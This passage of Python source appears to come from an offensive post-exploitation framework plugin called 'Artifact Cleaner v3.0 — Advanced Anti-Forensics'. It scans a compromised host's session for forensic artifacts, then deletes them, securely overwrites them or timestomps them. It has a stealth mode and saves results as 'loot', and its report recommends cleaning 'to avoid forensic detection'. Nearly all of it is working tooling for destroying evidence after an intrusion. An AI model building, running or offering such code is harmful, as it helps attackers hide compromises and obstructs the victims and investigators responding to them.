        do_clean = '--clean' in (args or [])
        stealth = '--stealth' in (args or [])
        aggressive = '--aggressive' in (args or [])
        categories = None
        technique = 'delete'
        
        for a in (args or []):
            if a.startswith('--category='):
                categories = [c.strip() for c in a.split('=', 1)[1].split(',')]
            elif a.startswith('--technique='):
                technique = a.split('=', 1)[1]
        
        if not scan_only and not do_clean:
            scan_only = True  # Default to scan mode
        
        self.info(f"🧹 Starting Artifact Cleaner v3.0 (mode={'scan' if scan_only else 'clean'})")
        
        # ── Step 1: Platform detection ──────────────────────────────────
        platform = self._detect_platform(session)
        start_time = time.time()
        
        sections = []
        sections.append("\n" + "━"*64)
        sections.append("  [🧹 Artifact Cleaner v3.0 — Advanced Anti-Forensics]")
        sections.append("━"*64)
        sections.append(f"  Platform: {platform.upper()}")
        sections.append(f"  Mode: {'SCAN ONLY' if scan_only else 'CLEAN'}")
        sections.append(f"  Technique: {technique}")
        
        # ── Step 2: Get artifacts ───────────────────────────────────────
        artifacts = ArtifactDatabase.get_artifacts(platform, categories)
        
        sections.append(f"\n[*] Phase 1: Scanning Artifacts")
        sections.append("─"*64)
        sections.append(f"  Found {len(artifacts)} artifact categories to scan")
        
        # ── Step 3: Scan artifacts ──────────────────────────────────────
        discovered = []
        metrics = CleaningMetrics()
        
        for artifact in artifacts:
            try:
                cmd = artifact.get('cmd_scan', '')
                if not cmd:
                    continue
                
                out = self._exec(session, cmd)
                if out and out.strip():
                    # Parse count or existence
                    count = 0
                    try:
                        count = int(out.strip())
                    except:
                        if 'exists' in out.lower() or 'true' in out.lower():
                            count = 1
                    
                    if count > 0:
                        discovered.append({
                            'artifact': artifact,
                            'count': count,
                            'evidence': out.strip()[:200]
                        })
                        metrics.total_artifacts += 1
                        
                        icon = {'critical': '🔴', 'high': '🟠', 'medium': '🟡', 'low': '🟢'}.get(artifact['risk'], '⚪')
                        sections.append(f"  {icon} {artifact['description']}: {count} items")
            
            except Exception as e:
                self.warn(f"Scan failed for {artifact.get('description', 'unknown')}: {e}")
        
        # ── Step 4: Clean artifacts (if requested) ──────────────────────
        if do_clean and discovered:
            sections.append(f"\n[*] Phase 2: Cleaning Artifacts")
            sections.append("─"*64)
            
            for item in discovered:
                artifact = item['artifact']
                cmd = artifact.get('cmd_clean', '')
                
                if not cmd:
                    continue
                
                if stealth and artifact['risk'] == 'critical':
                    sections.append(f"  [⏭️] Skipped {artifact['description']} (stealth mode)")
                    metrics.skipped += 1
                    continue
                
                sections.append(f"  [*] Cleaning: {artifact['description']}")
                
                try:
                    start = time.time()
                    
                    # Apply technique
                    if technique == 'overwrite' and platform == 'windows':
                        success = CleaningTechniques.secure_overwrite_windows(
                            self._exec, session, artifact['path']
                        )
                    elif technique == 'timestomp':
                        if platform == 'windows':
                            success = CleaningTechniques.timestomp_windows(
                                self._exec, session, artifact['path']
                            )
                        else:
                            success = CleaningTechniques.timestomp_linux(
                                self._exec, session, artifact['path']
                            )
                    else:
                        # Default: execute clean command
                        out = self._exec(session, cmd)
                        success = True
                    
                    duration = int((time.time() - start) * 1000)
                    
                    if success:
                        metrics.cleaned += 1
                        metrics.categories_cleaned.add(artifact['category'])
                        metrics.techniques_used.add(technique)
                        sections.append(f"      ✅ Cleaned ({duration}ms)")
                    else:
                        metrics.failed += 1
                        sections.append(f"      ❌ Failed")
                
                except Exception as e:
                    metrics.failed += 1
                    sections.append(f"      ❌ Error: {str(e)}")
        
        # ── Step 5: Verification ────────────────────────────────────────
        if do_clean:
            sections.append(f"\n[*] Phase 3: Verification")
            sections.append("─"*64)
            
            # Re-scan to verify
            remaining = 0
            for item in discovered[:10]:  # Verify top 10
                artifact = item['artifact']
                cmd = artifact.get('cmd_scan', '')
                if cmd:
                    try:
                        out = self._exec(session, cmd)
                        count = 0
                        try:
                            count = int(out.strip())
                        except:
                            if 'exists' in out.lower():
                                count = 1
                        if count > 0:
                            remaining += 1
                            sections.append(f"  ⚠️  {artifact['description']}: {count} items remaining")
                    except:
                        pass
            
            if remaining == 0:
                sections.append(f"  ✅ All artifacts successfully cleaned")
            else:
                sections.append(f"  ⚠️  {remaining} artifacts still present")
        
        # ── Step 6: Summary ─────────────────────────────────────────────
        metrics.duration_seconds = round(time.time() - start_time, 2)
        
        sections.append("\n" + "━"*64)
        sections.append("  [📊 Cleaning Summary]")
        sections.append("━"*64)
        sections.append(f"  Total Artifacts Scanned: {metrics.total_artifacts}")
        sections.append(f"  Cleaned: {metrics.cleaned}")
        sections.append(f"  Failed: {metrics.failed}")
        sections.append(f"  Skipped: {metrics.skipped}")
        sections.append(f"  Duration: {metrics.duration_seconds}s")
        sections.append(f"  Categories: {', '.join(metrics.categories_cleaned) if metrics.categories_cleaned else 'N/A'}")
        sections.append(f"  Techniques: {', '.join(metrics.techniques_used) if metrics.techniques_used else 'N/A'}")
        
        # ── Step 7: Create findings ─────────────────────────────────────
        if discovered:
            critical_count = sum(1 for d in discovered if d['artifact']['risk'] == 'critical')
            high_count = sum(1 for d in discovered if d['artifact']['risk'] == 'high')
            
            self.finding(
                title=f"Forensic Artifacts Detected — {len(discovered)} categories",
                description=f"Found {len(discovered)} categories of forensic artifacts:\n" +
                           f"  • Critical: {critical_count}\n" +
                           f"  • High: {high_count}\n" +
                           f"  • Medium/Low: {len(discovered) - critical_count - high_count}",
                severity="High" if critical_count > 0 else "Medium",
                recommendation="Clean artifacts to avoid forensic detection. Use --clean flag with appropriate technique.",
                mitre_id=self.mitre_id,
            )
            self.emit(
                'finding.created',
                severity='high',
                title='Forensic Artifacts Detected',
                plugin=self.name,
                confidence='high'
            )
        
        # ── Step 8: Save to loot ────────────────────────────────────────
        self.loot(
            {
                "type": "artifact_scan",
                "platform": platform,
                "mode": "scan" if scan_only else "clean",
                "metrics": metrics.to_dict(),
                "discovered": [
                    {
                        "description": d['artifact']['description'],
                        "category": d['artifact']['category'],
                        "risk": d['artifact']['risk'],
                        "count": d['count'],
                        "evidence": d['evidence']
                    }
                    for d in discovered
                ]
            },
            category='anti-forensics',
            source=f'artifact-cleaner:{platform}',
            confidence='high'
        )
        
        # Emit timeline event
        if do_clean and metrics.cleaned > 0:
            self.emit(
                'timeline.event',
                title=f"Artifacts Cleaned — {metrics.cleaned} categories",
                type='anti-forensics',
                plugin=self.name
            )
        
        self.info(f"🧹 Artifact Cleaner complete — {metrics.cleaned}/{metrics.total_artifacts} cleaned")
        
        return '\n'.join(sections)
    
    def _detect_platform(self, session) -> str:
        for attr in ('OS', 'os', 'platform'):
            val = getattr(session, attr, None)
            if val and isinstance(val, str):
                if 'windows' in val.lower():
                    return 'windows'
                if 'linux' in val.lower():
                    return 'linux'
        try:
            out = self._exec(session, 'echo %OS%') or ''
            if 'Windows' in out:
                return 'windows'
        except Exception:
            pass
        return 'linux'
    
    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, bytes):
                    return result.decode(errors='replace')
                if isinstance(result, str):
                    return result
        return ''